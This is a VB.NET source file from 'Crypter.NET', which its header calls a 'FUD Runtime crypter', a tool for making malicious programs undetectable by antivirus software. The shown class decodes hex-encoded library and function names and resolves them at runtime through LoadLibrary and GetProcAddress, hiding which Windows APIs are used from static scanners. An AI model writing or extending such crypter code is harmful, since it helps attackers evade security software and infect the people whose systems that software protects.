'=============================================================================
'                  Crypter.NET - FUD Runtime crypter 
'                 Copyright (C) 2010 fLaSh - Carlos.DF 
'                        <c4rl0s.pt@gmail.com> 
'                     <http://www.flash1337.com/>
' THIS SOFTWARE IS PROVIDED BY THE AUTHORS ``AS IS'' AND ANY EXPRESS OR
' IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
' OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
' IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY DIRECT, INDIRECT,
' INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
' NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
' DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
' THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
' (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
' THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
'=============================================================================
Imports System.Runtime.InteropServices
Imports System.Security.Permissions
Imports Microsoft.Win32.SafeHandles
Imports System.Runtime.ConstrainedExecution
Public MustInherit Class NativeDllCalls

    Public Function DynamicCall(ByVal sHexLib As String, ByVal sHexMethod As String, ByVal oType As System.Type) As [Delegate]
        ' Convert the hex data to string..
        Dim sLib As String = HexToString(sHexLib)
        Dim sMethod As String = HexToString(sHexMethod)
        ' Firts load lib 
        Dim oLibrary As SafeLibraryHandle = Methods.LoadLibrary(sLib)
        Dim dRet As [Delegate] = Nothing
        ' Check if is valid..
        If Not oLibrary.IsInvalid AndAlso Not oLibrary.IsClosed Then
            ' Get process address..
            Dim iProcess As IntPtr = Methods.GetProcAddress(oLibrary, sMethod)
            ' Get the delegate point..
            dRet = Marshal.GetDelegateForFunctionPointer(iProcess, oType)
            ' Close lib..
            oLibrary.Close()
        End If
        Return dRet
    End Function

    <SecurityPermission(SecurityAction.LinkDemand, UnmanagedCode:=True)> _
    Public NotInheritable Class SafeLibraryHandle
        Inherits SafeHandleZeroOrMinusOneIsInvalid

        Private Sub New()
            MyBase.New(True)
        End Sub

        Protected Overloads Overrides Function ReleaseHandle() As Boolean
            Return Methods.FreeLibrary(handle)
        End Function
    End Class

    Public NotInheritable Class Methods

        Private Const KERNEL32 As String = "kernel32"

        <DllImport(KERNEL32, CharSet:=CharSet.Auto, BestFitMapping:=False, SetLastError:=True)> _
        Public Shared Function LoadLibrary _
                    (ByVal fileName As String) As SafeLibraryHandle
        End Function

        <ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)> _
        <DllImport(KERNEL32, SetLastError:=True)> _
        Public Shared Function FreeLibrary _
                    (ByVal hModule As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean
        End Function

        <DllImport(KERNEL32)> _
        Public Shared Function GetProcAddress _
                    (ByVal hModule As SafeLibraryHandle, _
                     ByVal procname As String) As IntPtr
        End Function
    End Class

End Class